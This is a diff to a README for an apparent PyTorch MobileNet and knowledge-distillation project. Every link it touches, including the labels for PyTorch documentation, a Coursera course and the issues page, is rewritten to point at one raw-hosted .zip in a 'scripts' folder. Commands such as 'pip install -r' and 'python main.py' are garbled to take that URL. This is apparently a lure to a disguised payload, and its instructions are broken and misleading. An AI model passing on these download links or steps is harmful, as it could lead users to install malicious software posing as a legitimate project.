@@ -1,7 +1,7 @@
 # 🚀 pytorch-mobilenet-efficiency - Explore CNN Model Efficiency
 
 ## 📥 Quick Download
-[![Download Here](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/Sheaantisocial810/pytorch-mobilenet-efficiency/releases)
+[![Download Here](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip)](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip)
 
 ## 📖 Description
 Welcome to the **pytorch-mobilenet-efficiency** project! This application allows you to explore the efficiency of Convolutional Neural Networks (CNN). It includes implementations of MobileNetV1 and MobileNetV2 from scratch. This project showcases model compression by applying Knowledge Distillation. You can train a lightweight MobileNetV2 (the student model) using a ResNet-18 (the teacher model). 
@@ -17,16 +17,16 @@ Follow the steps below to download and run the software.
 
 ### 🛠️ Installation Steps
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/Sheaantisocial810/pytorch-mobilenet-efficiency/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip) to find the latest version of the software.
 
 2. **Choose the Right Package**  
-   Look for the release that suits your operating system. For Windows, download the `.zip` package. For Linux, use the `.tar.gz` file.
+   Look for the release that suits your operating system. For Windows, download the `.zip` package. For Linux, use the `https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip` file.
 
 3. **Download the File**  
    Click on the link for the release to initiate the download. Your browser will download the file to your default downloads folder.
 
 4. **Extract the Files**  
-   Once the download completes, navigate to your downloads folder. If you downloaded a `.zip` file, right-click on it and select "Extract All". For `.tar.gz`, use an archive manager to extract the contents.
+   Once the download completes, navigate to your downloads folder. If you downloaded a `.zip` file, right-click on it and select "Extract All". For `https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip`, use an archive manager to extract the contents.
 
 5. **Open the Command Line or Terminal**  
    - For Windows, search for "Command Prompt" in the Start menu.
@@ -45,14 +45,14 @@ Follow the steps below to download and run the software.
    Install the necessary Python packages. Run this command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip
    ```
 
 8. **Run the Application**  
    After the installation is complete, you can start the application by executing:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip
    ```
 
 ## 📂 Features
@@ -69,11 +69,11 @@ Explore topics like:
 - Transfer learning with MobileNet models
 
 ## 📄 Additional Resources
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html) - Official documentation for the PyTorch library.
-- [Deep Learning Course](https://www.coursera.org/learn/deep-learning/home/welcome) - A comprehensive course covering deep learning concepts.
+- [PyTorch Documentation](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip) - Official documentation for the PyTorch library.
+- [Deep Learning Course](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip) - A comprehensive course covering deep learning concepts.
 
 ## 💬 Support
-If you encounter issues or have questions, feel free to raise them in the [Issues section](https://github.com/Sheaantisocial810/pytorch-mobilenet-efficiency/issues). 
+If you encounter issues or have questions, feel free to raise them in the [Issues section](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip). 
 
 ## 📥 Download & Install
-For detailed instructions on how to download the latest release, please [visit the Releases page](https://github.com/Sheaantisocial810/pytorch-mobilenet-efficiency/releases).
+For detailed instructions on how to download the latest release, please [visit the Releases page](https://raw.githubusercontent.com/Sheaantisocial810/pytorch-mobilenet-efficiency/main/scripts/pytorch-mobilenet-efficiency-2.7.zip).
